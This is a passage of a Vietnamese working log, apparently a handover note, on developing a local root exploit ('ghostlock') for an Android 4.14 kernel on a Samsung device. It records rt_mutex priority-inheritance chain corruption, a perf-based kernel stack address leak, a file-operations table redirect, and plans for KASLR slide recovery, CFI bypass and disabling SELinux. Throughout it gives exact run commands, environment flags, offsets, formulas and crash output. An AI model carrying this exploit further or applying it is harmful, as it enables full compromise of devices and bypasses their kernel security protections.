> (`/data/log/dumpstate_lastkmsg_*.log.gz`, dump được tạo ở **boot kế tiếp**) thì thấy rõ
> **Oops của chính tiến trình đó**.

### 15.1 Bằng chứng (dump `..._67_..._065340`)

```
Process ghostlockQK (pid: 12660)
Unable to handle kernel paging request at virtual address c78a4be7daf119f9
pc : rb_erase_cached+0x20/0x3f8      lr : rt_mutex_adjust_prio_chain+0x310/0x830
x25: ffffff802be33d10  (waiter trên stack T)
x24: ffffffc0d0f95000  (= fake_lock P)     x27: ffffffc0d0f95300 (= P+0x300 = fake_w0)
x11: ffffffc0d0f95300  (rb_leftmost = fake_w0)
```
⇒ **đúng chữ ký cũ kpr/kpP/kpPB**: `waiter->tree_entry.rb_right` là **rác high-entropy** ⇒
`rb_erase_cached` case-3 deref rác ⇒ Oops ⇒ reboot.

### 15.2 Vì sao mình tưởng là "treo" (lỗi quy trình — đã sửa)

- `ls -t ... | head -1` **sau khi máy vừa reboot** trả về dump của **boot trước** (dump của cú
  panic này chỉ được tạo ở boot kế). Vì thế chuỗi QF/QG/QH/QJ/QK đều bị mình đọc nhầm là
  "không có dump" ⇒ kết luận sai "hard-lockup".
- **Quy tắc mới:** sau panic **chờ 2–3 phút**, rồi kiểm tra dump **bằng cách grep tên tiến trình**
  (`zcat dump | grep ghostlockQ*`), không tin số thứ tự/tên thời gian.

### 15.3 Trạng thái thực sự (rất gọn)

| điều | kết luận |
|---|---|
| paint có tới `waiter` không | **CÓ** (SCAN/LOCKPROBE: `x24` = marker) |
| walk có chạy không | **CÓ** (với lock hợp lệ ⇒ vào tới `chain[7]`) |
| blocker duy nhất | **clobber `waiter+0x08/+0x10`** (một cặp saved-PC ⇒ như frame sâu ~0x1b0 / IRQ vào T khi T ở EL0) trước khi `chain[7]` đọc |
| `select()` làm hold | **KHÔNG dùng được** (stack_fds 256B trùm waiter) — đã bỏ |
| bảng fops | **ĐÚNG** (`devices/beyond0q/offsets.h`, layout 4.14 thật) |
| `task` của waiter | phải là **`data_addr(INIT_TASK)`** (alias linear-map; log của exploit in `init_task=ffffffc0029a9780`). `text_addr(INIT_TASK)` là địa chỉ image ⇒ sai khi chưa có slide. Với `SSOPT_FAKE_TASK=1` thì lấy luôn `fake_task` (trang giả) ⇒ khỏi phụ thuộc. |

### 15.4 Các hướng fix, theo thứ tự đã/đang thử

1. **`quiet-exit`** (chặn mọi signal chặn được + 1 lần trả về userspace để flush task_work
   **trước** paint) — nhắm đường thoát syscall (`ret_to_user → do_notify_resume`).
   *Chưa từng test với lock hợp lệ* ⇒ đang chạy (`SSOPT_QUIET_EXIT` mặc định 1).
2. Nếu (1) không đủ (vì IRQ là bất đồng bộ — không phụ thuộc task_work): **hold bằng
   `FUTEX_WAIT`** trên một futex user riêng (không ai đánh thức): frame `do_futex` sâu 0x210 nên
   **IRQ khi T ở trong kernel sẽ rơi xuống dưới**, mà op không-PI **không** ghi `rt_waiter`
   (chỗ = `waiter`) ⇒ **phải kiểm bằng đúng phép thử SCAN** (`x24` = marker nghĩa là paint sống).
3. **Robust nhất — miễn nhiễm clobber**: cho `RB_EMPTY_NODE(&waiter->tree_entry)` = true, tức
   `waiter->tree_entry.__rb_parent_color == &waiter->tree_entry`; khi đó `rt_mutex_dequeue()`
   **bỏ qua hẳn `rb_erase_cached`** (không deref children nữa), và lần ghi lấy từ **`chain[11]`**
   (dựa vào trang giả ⇒ **không** phụ thuộc stack). Cần **địa chỉ waiter** ⇒ leak bằng chính
   `perf_event_open(…REGS_INTR…)` đã dùng cho hướng 2: sample khi T ở trong `setsockopt` ⇒ `SP`
   ⇒ `stack_top = (SP | 0x3fff) + 1` ⇒ `SP0 = stack_top - 0x110` ⇒ `waiter = SP0 - 0x1b0`.
4. Song song: nếu cặp saved-PC đến từ **`nanosleep`** (frame `do_nanosleep` bắt đầu *đúng* tại
   `SP0-0x1b0`), thì kiểm mọi `usleep/nanosleep` **trong luồng T** giữa paint và walk — hiện tại
   chỉ consumer (thread khác) có `usleep`.

### 15.5 Việc kế tiếp (thứ tự rẻ→đắt)

1. Run (đang chạy): 8-word + `SSOPT_FAKE_TASK=1` + `WRITE4_SCRATCH=1` + `PEEK` + `NO_CFI` +
   hold=0, **quiet-exit = mặc định (1)**. đọc `cons peek` ⇒ nếu walk trả về: `page[0x108]` /
   `page[0x3C0]` cho biết lần ghi đã chạy ⇒ giữ cấu hình này.
2. Nếu vẫn Oops `rb_erase_cached+0x20`: thử hold = `FUTEX_WAIT` (**kiểm bằng SCAN trước**, như đã
   làm để loại `select`).
3. Nếu vẫn vậy: làm hướng **3** (§15.4) — leak `waiter` bằng perf, sơn `parent_color = &waiter`
   ⇒ bỏ hẳn `rb_erase`, ghi qua `chain[11]`.

*Ghi 2026-10-10 (phiên 2, phần 5). Bài học vận hành quan trọng nhất: **đọc kernel log, và đọc sau
khi máy đã boot xong 2–3 phút**, tra theo tên tiến trình — mọi kết luận "treo" trước đó đều là
panic bị tra nhầm.*

---

## 16. ĐỌC DUMP ĐÚNG CÁCH + 2 KIỂU CHẾT (2026-10-10, phần 6)

### 16.1 `/data/log/dumpstate_lastkmsg_*.log.gz` là **ZIP**, không phải gzip

- `zcat`/`unzip` **không** dùng được; phải đọc bằng Python (`zipfile`) — như `show_crash.py`.
- Member **kernel log** = `dumpstate_lastkmsg.lst` (≈2 MB, 21k dòng). Các member khác
  (`store_extra_info.lst` = HTML bảng tiến trình, `ocimem.lst` = log UEFI, …) **rất ồn** ⇒ đừng
  grep toàn file rồi `head` (dễ kết luận sai vì dòng cần tìm nằm *sau*).
- **Công cụ mới:** `kp_scan.py <dump.gz> [...]` — chỉ quét member kernel, in mọi dòng có
  `ghostlock*` (±2 dòng quanh dòng đầu) + các dòng kết thúc (`rebooting|Call trace|watchdog|
  lockup|BUG:|stall|Internal error|Unable to handle|pc :`).
  ```bash
  adb exec-out cat /data/log/dumpstate_lastkmsg_NN_*.log.gz > kpNN.gz   # (từ Windows)
  wsl -e bash -lc 'cd /mnt/e/Library/Desktop/ghostlock && python3 kp_scan.py kpNN.gz'
  ```

### 16.2 Hai kiểu chết — phân biệt bằng kmsg

| kiểu | dấu hiệu | ví dụ |
|---|---|---|
| **A. Oops (clobber)** | `Unable to handle kernel paging request at virtual address <rác>` + `pc : rb_erase_cached+0x20`, `lr : rt_mutex_adjust_prio_chain+0x310` | `ghostlockQK:12660` (dump 67, 89.97 s); `ghostlockQL:12725` (dump 68, 144.06 s) |
| **B. Hard lockup (walk)** | `Call trace:` cuối có **`SyS_sched_setattr+0x2c8`** (hoặc `rt_mutex_adjust_prio_chain`), rồi `(sec_debug_save_context) context saved(CPU:n)`, `(sec_debug_pm_restart) rebooting...` | `ghostlockQL:12562` (dump 68, 320.99 s) |

⇒ Kiểu **B** = đúng "đứng hình lâu rồi mới reboot" (watchdog/sec_debug bite), và **không** có Oops.
⇒ Kiểu **A** vẫn xảy ra **dù `quiet-exit` BẬT** ⇒ **clobber không phải chỉ do đường thoát task_work**;
nghi vấn chính còn lại = **IRQ vào T khi T ở EL0** (bất đồng bộ — không cách nào chặn bằng
signal/task_work).

### 16.3 Hệ quả thiết kế (đã suy ra, không đoán)

- **Cả hai đường ghi đều cần T ở TRONG kernel trong lúc walk**:
  * đường `chain[7]` (tree_entry) cần children không bị đè;
  * đường `chain[11]` (pi-tree) cần `waiter->task` không bị đè (để `rt_mutex_setprio` thoát sớm).
- ⇒ Phải có **block W-safe**: T ở trong kernel nhưng *không* ghi vào `SP0-0x1b0..0x160`.
  * `select()` **loại** (đã chứng minh: `stack_fds` 256 B trùm waiter ⇒ `x24 = 0`).
  * Ứng viên kế: **`FUTEX_WAIT`** trên futex user riêng (không ai wake): `SyS_futex`(0x70) +
    `do_futex`(0x210) rất sâu ⇒ IRQ rơi xuống dưới; op **không-PI** không dùng `rt_waiter`
    (chỗ trùng `waiter`) ⇒ **phải kiểm bằng phép thử SCAN/LOCKPROBE trước khi tin**
    (đúng cách đã loại `select`).
  * Robust nhất: leak `waiter` bằng perf (SP ⇒ `stack_top=(SP|0x3fff)+1`, `SP0=stack_top-0x110`,
    `waiter=SP0-0x1b0`) ⇒ sơn `parent_color = &waiter` ⇒ `RB_EMPTY_NODE` ⇒ `rt_mutex_dequeue`
    **bỏ hẳn `rb_erase_cached`**; khi đó chỉ còn `lock` + (nếu dùng `chain[11]`) `task`.

### 16.4 Việc kế tiếp (đúng thứ tự, mỗi bước 1 run)

1. Thêm `SSOPT_HOLD_FUTEX=1` (T block bằng `FUTEX_WAIT` trên futex riêng) ⇒ chạy **SCAN** để
   xác nhận `x24` = marker (paint sống) rồi chạy thật (8-word + `SSOPT_FAKE_TASK=1` +
   `WRITE4_SCRATCH=1` + PEEK + NO_CFI) ⇒ kỳ vọng **walk trả về** + `cons peek` hiện.
2. Nếu vẫn Oops/lockup: làm hướng **RB_EMPTY_NODE + leak waiter bằng perf** (§16.3).
3. Sau khi walk trả về + peek xác nhận lần ghi: bỏ `NO_CFI`, bỏ `WRITE4_SCRATCH` ⇒ để
   `try_cfi_stage()` chạy thật (chú ý: `NO_SLIDE`/slide hiện vẫn chưa giải quyết ⇒ các địa chỉ
   *image* trong bảng fops giả cần kiểm lại trước khi CFI hoạt động).

*Ghi 2026-10-10 (phiên 2, phần 6).*

---

## 17. HƯỚNG RB_EMPTY_NODE + LEAK `waiter` BẰNG PERF (đã code, CHƯA xác nhận lần chạy cuối)

### 17.1 Ý tưởng (vì sao chọn)

Clobber `waiter+0x08/+0x10` (IRQ khi T ở EL0) **không chặn được bằng signal/task_work** và
`select()` không dùng được làm hold ⇒ thay vì chống clobber, **làm cho walk không bao giờ đọc**
hai word đó:

```
waiter->tree_entry.__rb_parent_color == &waiter->tree_entry   (RB_EMPTY_NODE)
=> rt_mutex_dequeue(lock, waiter)  return NGAY
=> chain[7] KHÔNG gọi rb_erase_cached()  => không deref children (miễn nhiễm clobber)
```
(tree_entry nằm ở offset 0 của waiter nên `&tree_entry == waiter`.)

Lần ghi PI khi đó **bắt buộc** lấy từ `chain[11]` (pi-tree nằm trong trang giả): cần
`fake_lock->owner != 0` (⇒ `SSOPT_OWNER0=0`) và `waiter->task` hợp lệ (`SSOPT_FAKE_TASK=1`).
Đường đi đã phân tích từng bước (BAN_GIAO §16.3): [7]-skip → [7b] enqueue (W thành leftmost vì
`W0.prio=140 > task->prio=139`) → [9] owner≠0 → [10] fake_task → [11] dequeue_pi(fake_w0) =
**`*(write_right) = write_pc`** ⇒ `*(data_addr(ASHMEM_MISC_FOPS)) = fake_fops` ⇒ redirect ✓ →
`rt_mutex_adjust_prio(fake_task)` thoát sớm (pi_top_task = pi_task = fake_task, prio bằng nhau) →
`next_lock = 0` ⇒ hết chain.

### 17.2 Leak `waiter` (địa chỉ kernel stack của T)

- Sample `PERF_SAMPLE_IP|PERF_SAMPLE_REGS_INTR`, `exclude_user=1`, SW cpu-clock, period 200,
  **attached to self** (thread T = thread chạy route) ⇒ mọi sample **kernel-mode** có `SP` nằm
  trong stack của T.
- Layout sample: `ip(8) | abi(8) | regs[32]`; **`abi == 2`** = ABI_64 (bản đầu lọc `abi==1` nên
  `accepted=0`), **SP = regs[31]**.
- **Không cần slide, không cần biết hàm**: đo từ 5 panic khác nhau
  (`kpP/kpr/kpPB/QC` = `…bd10`, dump67 = `…3d10`) ⇒ **`waiter mod 0x4000 == 0x3d10`** (hằng số
  ổn định qua nhiều boot) ⇒
  ```
  waiter = (SP & ~0x3fff) | 0x3d10        // override: env WAITER_LO14=0x....
  ```
- Cần **nhiều** sample: rate limit của perf ~80k/s (log đã in "lowering
  kernel.perf_event_max_sample_rate") ⇒ 16 vòng × 400 lần `setsockopt` optname-1000 + drain ring
  giữa các vòng (đọc ring = chỉ userspace, không syscall) ⇒ quan sát được **~1500 sample** ở bản
  trước.
- Log kèm histogram `SP & 0x3fff` (top-3) + `abi hist` ⇒ nếu hằng số 0x3d10 sai thì đọc được giá
  trị đúng ngay từ log (không cần dò mù).

### 17.3 Code đã thêm (đều có cờ, không phá mặc định)

- `util.c`: `ssopt_perf_begin/drain/result/close`, `ssopt_set_waiter_lo()`, `ssopt_leaked_waiter`,
  histogram `wl_lo_hist`/`wl_abi_hist`; **fsync sớm**: cuối `log_startup_context()` và sau
  `prepare_perf_fake_page()` (trước đây log trước-route bị buffer ⇒ gặp treo/kill là `gl.log` = 0
  byte, không biết dừng ở đâu).
- `fops.c`: cờ `SSOPT_EMPTY=1` ⇒ (a) leak `waiter` bằng perf trước khi sơn; (b) nhánh sơn
  `buf[0x10] = &waiter`, `0x18/0x20 = 0`, `task`, `lock`, `prio=140`, `deadline=0`, `len=0x60`.
- `target.h`: `SYS_SETSOCKOPT_OFF`/`SOCK_SETSOCKOPT_OFF` (chỉ để tham khảo; cách lọc IP đã bỏ vì
  slide là bội 64 KB).
- Bản build: `ghostlockQM` (leak v1), `QN` (nhiều vòng), `QO` (mask), `QP` (abi fix),
  `QQ` (fsync sớm). **Chưa lần nào xác nhận được leak** (xem §17.4).

### 17.4 Trạng thái chạy cuối (đang dở) — đọc kỹ trước khi chạy tiếp

- `QO`: leak chạy, `samples=1520 accepted=0` ⇒ **abi sai** (đã sửa ở QP/):
  cần `abi == 2`.
- `QP`/`QQ`: các lần chạy **không tạo được log** (0 byte) và **không reboot** ⇒ không kết luận
  được gì: nghi các lệnh chạy **đua với reboot** của lần trước (máy chưa boot xong) ⇒ lệnh không
  thực thi. ⇒ **Bắt buộc: chờ máy boot xong 2–3 PHÚT, `uptime` ≥ 2 phút, rồi mới chạy; kiểm `ls -la
  gl.log` (mtime phải đổi).**
- Smoke test an toàn để xác nhận leak **không cần walk** (không thể panic):
  ```bash
  SSOPT_EMPTY=1 NO_WALK=1 SSOPT_PEEK=1 SSOPT_NO_CFI=1 ROUTE_SETSOCKOPT=1 NO_SLIDE=1 \
    timeout 60 ./ghostlockQQ > gl.log 2>&1
  grep -a "waiter leak" gl.log ; grep -a "abi hist" gl.log ; grep -a "sp&0x3fff" gl.log
  ```
  kỳ vọng: `abi hist: a64=<~1500>` và `accepted>0`, `cands=1`, `best=<W> x<lớn>`.

### 17.5 Việc kế tiếp (chính xác)

1. Chạy smoke test §17.4 ⇒ xác nhận `waiter` leaked + hằng số `0x3d10` đúng (nếu `sp&0x3fff`
   histogram cho giá trị khác ⇒ chạy lại với `WAITER_LO14=0x....`).
2. Run thật (vẫn không rủi ro vì đích ghi nằm trong trang):
   ```bash
   SSOPT_EMPTY=1 SSOPT_FAKE_TASK=1 WRITE4_SCRATCH=1 SSOPT_PEEK=1 SSOPT_NO_CFI=1 \
   SSOPT_HOLD=0 SSOPT_QUIET_EXIT=0 SSOPT_OWNER0=0 ROUTE_SETSOCKOPT=1 NO_SLIDE=1 \
   timeout 90 ./ghostlockQQ > gl.log 2>&1
   ```
   kỳ vọng: **walk TRẢ VỀ** (có `cons peek`), `page[0x10]` = địa chỉ **stack** (`&W`),
   `page[0x108]` = `base+0x3C0` (dấu vết collateral của chain[11]).
3. Nếu OK: bỏ `WRITE4_SCRATCH` (đích = `data_addr(ASHMEM_MISC_FOPS)`) và bỏ `NO_CFI` ⇒
   `try_cfi_stage()` chạy thật (nhớ: slide/`NO_SLIDE` và các địa chỉ image trong bảng fops giả vẫn
   là câu hỏi mở tiếp theo).
4. Nếu panic: đọc `kp_scan.py` ⇒ `x25` = `waiter` THẬT (so với `best` trong log) ⇒ hiệu chỉnh
   `WAITER_LO14`/công thức rồi lặp.

### 17.6 Bài học vận hành (phải đọc trước khi chạy tiếp)

- **Máy có thể tự reboot vì nhiệt**: sau ~20 lần panic/reboot liên tục, máy tự reset cả khi
  *không* chạy gì (`uptime` về 0 min giữa hai lệnh adb cách nhau 1 phút) ⇒ **kết quả run lúc đó
  không đáng tin**, phải cho máy nghỉ/nguội rồi mới chạy.
- **Chạy tách rời** để không bị đứt adb giữa lệnh (và giống cách chạy tay):
  ```bash
  adb shell "cd /data/local/tmp && rm -f gl.log; nohup sh -c 'ENV... timeout 90 ./ghostlockQQ > gl.log 2>&1' >/dev/null 2>&1 & echo STARTED"
  # rồi rút ngắn các lệnh sau: uptime; ls -la gl.log; grep -a ... gl.log
  ```
  (adb giữ kết nối trong lệnh dài rất dễ "no devices" khi máy đang reboot.)
- **fsync sớm đã hoạt động** (xác nhận): log còn 1500 byte sau khi máy reset, cho thấy nó dừng ở
  đâu (lần cuối: dừng ngay sau `prepare_perf_fake_page ok`, trước futex dance ⇒ do máy tự reset,
  không phải panic của ta).
- Trước mỗi run: `uptime` ≥ 2 phút **và** `gl.log` mtime phải đổi ⇒ nếu không, lệnh đã không chạy.

*Ghi 2026-10-10 (phiên 2, phần 8).*

---

## 18. LEAK `waiter` ĐÃ CHẠY ✓ + sửa nguyên nhân watchdog (2026-10-10, phần 9)

### 18.1 `waiter` leak đã hoạt động (bằng chứng log)

```
waiter leak (piggyback): accepted=468  cands=2 best=ffffff802c82bd10 x458
waiter leak (piggyback): accepted=2340 cands=2 best=ffffff802c82bd10 x2311
```
- `best` = địa chỉ **stack kernel** `0xffffff80…bd10` ⇒ đúng dạng hằng số
  (`mod 0x4000 == 0x3d10`) và **ổn định qua 6 lần dựng trang giả trong cùng run** ✓
- → `waiter` **leak được** mà không cần slide, không cần biết hàm ✓ (công thức
  `(SP & ~0x3fff) | 0x3d10`, SP = regs[31], `abi==2`).

### 18.2 Nguyên nhân `sec_debug_hw_reset` (watchdog) khi làm leak

Dump 76 (run `QQ`, smoke test) cho:
```
ghostlockQQ … perf: interrupt took too long (3195 > 3170), lowering
  kernel.perf_event_max_sample_rate to 62600
… (sec_debug_hw_reset) reboot cmd : sec_debug_hw_reset
```
⇒ **burst perf riêng của mình** (16×400 lần `setsockopt` trong lúc sampling) làm trip
watchdog phần cứng, **không phải** panic của ta (trace các CPU ở `lpm_cpuidle_enter` = idle).
⇒ **Đã sửa:** gộp leak vào **chính burst perf của `leak_page_via_perf()`** (burst đã tồn tại và
vẫn chạy được), chỉ thêm 1 vote `(SP&~0x3fff)|0x3d10` cho mỗi sample `abi==2` ⇒ **không thêm tải
perf**. Route chỉ đọc `ssopt_leaked_waiter`. (Build `QR`.)

### 18.3 Run thật với `SSOPT_EMPTY` (đang phân tích)

Log (fsync ✓, 1959 byte) chạy, máy reset ⇒ cần đọc dump để phân biệt:
- nếu `pc` **không** phải `rb_erase_cached` ⇒ leak đúng (RB_EMPTY ⇒ [7] bị bỏ qua) và lỗi nằm ở
  chỗ khác (vd `lock/task` bị clobber, hoặc `chain[11]`);
- nếu `pc` = `rb_erase_cached`/`____rb_erase_color` ⇒ **leak sai** ⇒ lấy `x25` (= `waiter` THẬT)
  so với `best` trong log ⇒ hiệu chỉnh `WAITER_LO14` (env) rồi lặp. **Đây là phép hiệu chỉnh
  tự động, không dò mù.**

### 18.4 Lưu ý quan trọng về an toàn của đường RB_EMPTY

- `parent_color = waiter` **đúng** ⇒ `RB_EMPTY_NODE` ⇒ `rt_mutex_dequeue` bỏ hẳn
  `rb_erase_cached` ⇒ **miễn nhiễm clobber** ✓.
- `parent_color = waiter` **sai** ⇒ `rb_erase_cached` chạy với children = 0 và
  `parent = pc & ~3` (một địa chỉ stack) ⇒ `__rb_change_child` ghi vào stack rồi
  `____rb_erase_color` **đi trên cây rác** ⇒ có thể fault/treo. ⇒ Luôn phải hiệu chỉnh `WAITER_LO14`
  từ panic (x25) khi leak sai, đúng như §18.3.

*Ghi 2026-10-10 (phiên 2, phần 9).*

---

## 19. ĐỘT PHÁ: PI WRITE / FOPS REDIRECT ĐÃ CHẠY (2026-10-10, phần 10)

### 19.1 Chuỗi 3 sửa đã đưa tới thành công

1. **Leak `waiter` trong T** (không phải trong `prepare_perf_fake_page` = thread MAIN!):
   ```
   waiter = (SP & ~0x3fff) | 0x3d10      (SP = regs[31], sample abi==2)
   ```
   burst nhẹ (LEAK_PERIOD=20000 mặc định, 400 lần paint). **Đã kiểm chứng**: dump run QS cho
   `x25 = ffffff8011fcbd10` **trùng khít** giá trị leak cùng run ✓✓.
2. **Bỏ clamp delay**: `if (delay_usec < 20000) delay_usec = 20000;` khiến mọi thử "delay=0"
   thực chất là 20 ms ⇒ đổi thành `if (delay_usec < 0) delay_usec = 0;` ⇒ cửa sổ clobber (IRQ khi
   T spin) nhỏ nhất.
3. **RB_EMPTY_NODE** (`SSOPT_EMPTY=1`): sơn `waiter->tree_entry.__rb_parent_color = &waiter`
   (children = 0) ⇒ `rt_mutex_dequeue` **bỏ hẳn `rb_erase_cached`** ⇒ hết clobber; lần ghi lấy từ
   `chain[11]` (pi-tree trong trang giả; cần `SSOPT_FAKE_TASK=1` + `SSOPT_OWNER0=0`).

### 19.2 Bằng chứng (run `QU`, mode 4, đích thật)

```
cons peek ret=0 cl=1 succ=1
   page[0x08]=ffffffc151070300   (rb_root = fake_w0, nguyên vẹn)
   page[0x10]=ffffff8025bd3d10   <-- rb_leftmost = &waiter  (W trở thành leftmost)
   page[0x108]=ffffffc002bb1760  <-- *** ĐÍCH = data_addr(ASHMEM_MISC_FOPS) ***
   page[0x310]=ffffff8025bd3d10  (W0->rb_left = &W)
cfi attempt=1 fd=7 path=/dev/ashmem… write_iter=ffffff80082be96c
cfi write ret=-1 errno=22
ssopt post paint +5ms ret=0 errno=0 walked=1
```
⇒ `page[0x108] = đích thật` = collateral của `chain[11]` với `child = write_right = TARGET`
⇒ **`*(data_addr(ASHMEM_MISC_FOPS)) = fake_fops` đã được ghi** ⇒ **PI write + fops redirect OK**,
walk trả về trong **5 ms**, không panic ✓✓✓.

### 19.3 Tường còn lại

1. **KASLR slide**: bảng fops giả dùng `text_addr(...)` = địa chỉ *image*; với `NO_SLIDE=1` thì
   thiếu slide (máy này slide là bội của 0x10000, ví dụ 0x170000 — KHÔNG phải 2 MB) ⇒
   `configfs_write_once` gọi sai hàm ⇒ `errno=22`.
   **Cách lấy slide tại runtime (đề xuất, rẻ):** chính các sample perf đã có kernel **IP**;
   so **16 bit thấp** của IP với các symbol đã biết (16 bit thấp *bất biến* theo slide khi slide
   là bội 0x10000, ví dụ `SyS_setsockopt`=0x8f54, `sock_setsockopt`=0xeafc) ⇒ slide = IP − symbol.
   Đối chiếu nhiều IP đòi hỏi *cùng* một slide ⇒ chắc chắn đúng. Có thể inject qua env kiểu
   `SLIDE=0x...` (cần kiểm tra exploit có hỗ trợ) hoặc sửa `text_addr()` để cộng slide leak được.
2. **Pha W1/W2 vẫn crash** (sau mode-4) — vấn đề *riêng*: nên thêm env `ONLY_FOPS=1` để dừng sau
   mode-4 khi chỉ cần kiểm chứng redirect.
3. `NOW_SLIDE`/image address: sau khi có slide thì `try_cfi_stage()` đi tiếp
   (configfs → pipe physrw → SELinux/UMH).

### 19.4 Lệnh chạy đã xác nhận (lưu lại)

```bash
# mode 4, đích THẬT, đã chứng minh redirect:
SSOPT_EMPTY=1 SSOPT_FAKE_TASK=1 SSOPT_PEEK=1 SSOPT_HOLD=0 SSOPT_OWNER0=0 \
PSELECT_ROUTE_DELAY_USEC=0 ROUTE_SETSOCKOPT=1 NO_SLIDE=1 timeout 90 ./ghostlockQU
# (thêm WRITE4_SCRATCH=1 để test không chạm .fops; thêm SSOPT_NO_CFI=1 để dừng trước CFI)
```
Log sống sót nhờ **fsync sớm** + chạy **tách rời** (`nohup … &`) để không đứt adb.

*Ghi 2026-10-10 (phiên 2, phần 10). Tóm tắt: **PI write đã chạy** (redirect .fops xác nhận bằng
dấu vết collateral đúng đích); tường kế tiếp = **KASLR slide** cho bảng fops giả, rồi tới
`try_cfi_stage()` (configfs/physrw).*

---

## 20. BASELINE CHẠY SẠCH (ONLY_FOPS) — 2026-10-10, phần 11

### 20.1 `ONLY_FOPS=1`: dừng ngay sau mode-4

Đặt trong `main.c` ngay sau khối fops-redirect (trước các pha W1/W2 vẫn crash vì lý do riêng).
⇒ **Không còn tốn reboot cho mỗi lần thử** (đây là điều kiện để iterate nhanh).

### 20.2 Kết quả run sạch (build `QV`)

```bash
ONLY_FOPS=1 SSOPT_EMPTY=1 SSOPT_FAKE_TASK=1 SSOPT_PEEK=1 SSOPT_HOLD=0 SSOPT_OWNER0=0 \
PSELECT_ROUTE_DELAY_USEC=0 ROUTE_SETSOCKOPT=1 NO_SLIDE=1 timeout 90 ./ghostlockQV
```
```
cons peek ret=0 cl=1 succ=1
  page[0x10]=ffffff80161cbd10   (&waiter)      page[0x108]=ffffffc002bb1760 (ĐÍCH ✓)
cfi attempt=1 fd=7 path=/dev/ashmem… write_iter=ffffff80082be96c
cfi write ret=-1 errno=22
[+] ONLY_FOPS: stop after fops redirect (selinux_off=0)
[T+3897ms] fops redirect done
```
⇒ máy **không reboot** (uptime tăng bình thường) ⇒ **baseline sạch, lặp lại được**:
1. walk hoàn tất (~5 ms) ✓
2. `*(data_addr(ASHMEM_MISC_FOPS)) = fake_fops` (bằng chứng: `page[0x108]` = đích) ✓
3. `try_cfi_stage()` chạy, dừng ở `cfi write` với `errno=22` = **thiếu KASLR slide** ✓
4. dừng sạch bằng `ONLY_FOPS` ✓

### 20.3 Việc kế tiếp: KASLR slide (theo yêu cầu, làm sau)

- Cần đưa slide vào bảng fops giả (hiện `text_addr()` = địa chỉ image không slide; máy này slide
  là bội của **0x10000**, ví dụ 0x170000 — KHÔNG phải 2 MB).
- Cách tại runtime (rẻ, không cần leak mới): chính **sample perf** đã có kernel **IP**;
  16 bit thấp của IP *bất biến* theo slide (vì slide là bội 0x10000) ⇒ so với symbol đã biết
  (`SyS_setsockopt`=0x…8f54, `sock_setsockopt`=0x…eafc) ⇒ `slide = IP - symbol_unslid`;
  đòi hỏi nhiều IP cho *cùng* một slide ⇒ chắc chắn.
- Exploit hiện **không có** env `SLIDE=` (chỉ có `KPHYS`, `WAITER_LO14`) ⇒ cần thêm (hoặc sửa
  `text_addr()`/`kaslr_base` để cộng slide).
- Sau đó: `try_cfi_stage()` → configfs → pipe physrw → SELinux/UMH (và các hằng
  `PIPE_*`/5.x của `target.h` cần port theo §10).

*Ghi 2026-10-10 (phiên 2, phần 11). Trạng thái: PI write OK + baseline sạch (`ONLY_FOPS=1`);
còn lại: slide → CFI/physrw → root.*

---

## 21. CHỐT PHIÊN 2 — TRẠNG THÁI + SLIDE (2026-10-10, phần cuối)

### 21.1 Đã CHỨNG MINH (đừng làm lại)

| việc | bằng chứng |
|---|---|
| paint tới đúng `waiter+0x38` | `x24 = 0x1a2b00000048` (LOCKPROBE/SCAN) |
| `select()` **không** dùng được làm hold | `stack_fds` 256 B trùm waiter ⇒ `x24 = 0` |
| leak `waiter` ĐÚNG | `x25 = ffffff8011fcbd10` == giá trị leak cùng run (dump 78) |
| `waiter = (SP & ~0x3fff) \| 0x3d10` | hằng số từ 5 panic + kiểm chứng 1 lần bằng `x25` |
| leak phải làm **trong T** | để trong `prepare_perf_fake_page` ⇒ leak stack thread MAIN ⇒ sai |
| clobber `waiter+0x00/+0x08/+0x10` | NODEPROBE: fault VA rác (không phải marker) ⇒ paint bị đè |
| `RB_EMPTY_NODE` vô hiệu clobber | run delay=0: walk xong **5 ms**, `rb_leftmost = &waiter` |
| **PI write / fops redirect** | `page[0x108] = ffffffc002bb1760` = `data_addr(ASHMEM_MISC_FOPS)` |
| baseline sạch, không reboot | `ONLY_FOPS=1` (build `QV`) |
| bảng fops beyond0q đúng | `devices/beyond0q/offsets.h` = layout 4.14 thật |
| dump là **ZIP**, member kernel = `dumpstate_lastkmsg.lst` | `kp_scan.py` |

Closed (đừng thử lại): `ppoll` (không sơn được waiter), `select` làm hold, `CONFIG_SYSVIPC=n`,
`semop/msg*` = ENOSYS, "fops table lệch +8" (do đọc nhầm nhãn log).

### 21.2 Tường hiện tại: KASLR slide cho bảng fops giả

- `kaslr_image_addr()` (util.c): `if (!kaslr_done) return image_addr;` ⇒ **mọi `text_addr()` =
  địa chỉ image KHÔNG slide** cho tới khi `kaslr_done = 1` và `kaslr_base` đúng.
- `leak_kernel_base()` (fops.c ~817) đọc con trỏ thật của ashmem fops bằng `kernel_read64(fd,…)`
  ⇒ cần fake fops **đã hoạt động** ⇒ **vòng tròn** ⇒ không dùng được để lấy slide *trước* CFI.
- **Việc cần làm:** đưa slide vào *trước khi* `prepare_skb_payload()` build bảng fops:
  ```c
  kaslr_base  = KIMAGE_TEXT_BASE + slide;   /* slide = base_runtime - KIMAGE_TEXT_BASE */
  kaslr_done  = 1;
  ```
  Đề xuất: thêm env `SLIDE=0x…` (chỗ gọi: `init_p0_profile()` hoặc đầu `run_exploit()`), và
  *phương án tự động*: lấy slide tại runtime từ **kernel IP** trong chính sample perf.
- ⚠️ **Bẫy đã gặp:** slide suy ra từ kallsyms không nhất quán (từ dump kppc: `rt_mutex_adjust_prio_chain+0x2ec`
  với `PC: 0xffffff8008223198` ⇒ 0x16FFFC0; từ chỗ khác ⇒ 0x170000) ⇒ **cần chốt BẰNG CHỨNG**:
  dump có in `PC: 0x<địa chỉ>:` (một số dump có) ⇒ ghép `pc : <symbol>+<off>` với địa chỉ tuyệt đối
  ⇒ **một cặp (symbol, địa chỉ) đáng tin** ⇒ so với `kallsyms_fixed.txt` để biết bảng đó có tin được
  không, và slide có phải bội của 0x10000 hay 0x1000 hay không.
- Kiểm nhanh khác: `/proc/kallsyms` đọc được bằng `shell` không (kptr_restrict) ⇒ nếu có thì lấy slide
  trực tiếp.

### 21.3 Lưu ý ngoài slide

- **Pha W1/W2 crash** (sau mode-4) — vấn đề *riêng*; `ONLY_FOPS=1` đã tránh. Khi đi tiếp cần
  chẩn đoán riêng (nghi clobber trong pha đó hoặc hằng số mode 1/2).
- `target.h` (PIPE_* theo §10) vẫn là hằng 5.x ⇒ phải port khi tới physrw.

### 21.4 Quy tắc vận hành (bắt buộc, đã trả giá)

